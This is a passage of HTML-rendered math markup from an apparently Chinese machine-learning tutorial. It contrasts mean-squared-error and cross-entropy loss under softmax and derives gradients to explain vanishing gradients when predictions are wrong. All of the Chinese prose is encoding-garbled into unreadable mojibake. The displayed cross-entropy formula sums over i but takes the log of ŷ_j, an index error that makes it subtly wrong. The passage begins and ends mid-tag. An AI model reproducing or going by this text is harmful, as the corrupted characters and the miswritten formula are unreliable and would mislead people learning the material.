mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span><span class="mopen">(</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03785em;">Î´</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0379em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span><span class="mclose">)</span></span></span></span></span></div>
<p>ç„¶åè¿™ä¸ªå…¬å¼é¢ä¸´ç€<strong>æ¢¯åº¦æ¶ˆå¤±</strong>é—®é¢˜ï¼Œå‡è®¾ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">y_i = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>ï¼Œè€Œé¢„æµ‹å€¼å¦‚ä¸‹ï¼š</p>
<ul>
<li>å½“é¢„æµ‹æ­£ç¡®æ—¶ï¼Œå³ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover><mo>â‰ˆ</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\hat{y_i}\approx1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>ï¼Œæ¢¯åº¦è¶‹è¿‘äº0ï¼Œæ­¤æ—¶æ­£å¸¸ï¼›</li>
<li>å½“é¢„æµ‹<strong>é”™è¯¯</strong>æ—¶ï¼Œå³ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover><mo>â‰ˆ</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\hat{y_i}\approx0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span>ï¼Œæ­¤æ—¶æ¢¯åº¦ä¹Ÿè¶‹è¿‘äº0ï¼Œè¿™å°±ä¸æ­£å¸¸äº†ï¼Œå› ä¸ºé¢„æµ‹å€¼å’Œå®é™…å€¼ç›¸å·®å¾ˆè¿œï¼Œå³é”™è¯¯å¾ˆå¤§ï¼Œä½†æ˜¯æ›´æ–°çš„æ­¥é•¿ä¹Ÿå¾ˆå°ï¼Œè¿™å°±<strong>å¯¼è‡´è®­ç»ƒè¿‡ç¨‹ä¼šéå¸¸ç¼“æ…¢ç”šè‡³åœæ»ï¼Œéš¾ä»¥é€ƒç¦»è¿™ä¸ªâ€œå±€éƒ¨é™·é˜±â€ï¼</strong></li>
</ul>
<p><strong>è€Œå½“æˆ‘ä»¬ä½¿ç”¨äº¤å‰ç†µæŸå¤±æ—¶</strong>ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><mo>=</mo><mo>âˆ’</mo><munderover><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><msub><mi>y</mi><mi>i</mi></msub><mi>log</mi><mo>â¡</mo><mover accent="true"><msub><mi>y</mi><mi>j</mi></msub><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">L = -\sum_{i=1}^{m}y_i\log\hat{y_j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"/><span class="mord">âˆ’</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">âˆ‘</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></div>
<p>å’Œä¸Šé¢ä¸€æ ·ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mi>L</mi></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>o</mi><mi>j</mi></msub></mrow></mfrac><mo>=</mo><munderover><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mi>L</mi></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover></mrow></mfrac><mo>â‹…</mo><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>o</mi><mi>j</mi></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial L}{\partial o_j} = \sum_{i=1}^{m}\frac{\partial L}{\partial \hat{y_i}} \cdot \frac{\partial \hat{y_i}}{\partial o_j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.3435em;vertical-align:-0.9721em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mathnormal">L</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">âˆ‘</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mathnormal">L</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:2.3435em;vertical-align:-0.9721em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p>å› ä¸ºéƒ½æ˜¯softmaxè¡¨è¾¾å¼ï¼Œæ‰€ä»¥ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>o</mi><mi>j</mi></msub></mrow></mfrac><mo>=</mo><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover><mo stretchy="false">(</mo><msub><mi>Î´</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo>âˆ’</mo><mover accent="true"><msub><mi>y</mi><mi>j</mi></msub><mo>^</mo></mover><mo stretchy="false">)</mo><mtext>ï¼Œ</mtext><msub><mi>Î´</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.25em" columnalign="right" columnspacing=""><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mn>1</mn><mo separator="true">,</mo><mi>i</mi><mo>=</mo><mi>j</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mn>0</mn><mo separator="true">,</mo><mi>i</mi><mo mathvariant="normal">â‰ </mo><mi>j</mi></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">\frac{\partial \hat{y_i}}{\partial o_j} = \hat{y_i}(\delta_{ij}-\hat{y_j})ï¼Œ \delta_{ij} = \left\{ \begin{aligned} 1, i =j \\ 0, i \neq j \end{aligned} \right.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.3435em;vertical-align:-0.9721em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"/><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span/></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03785em;">Î´</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0379em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"/><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03785em;">Î´</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0379em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.75em;"><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="inner"><span class="mord"><span class="mrel">î€ </span></span></span><span class="fix"/></span></span></span></span><span 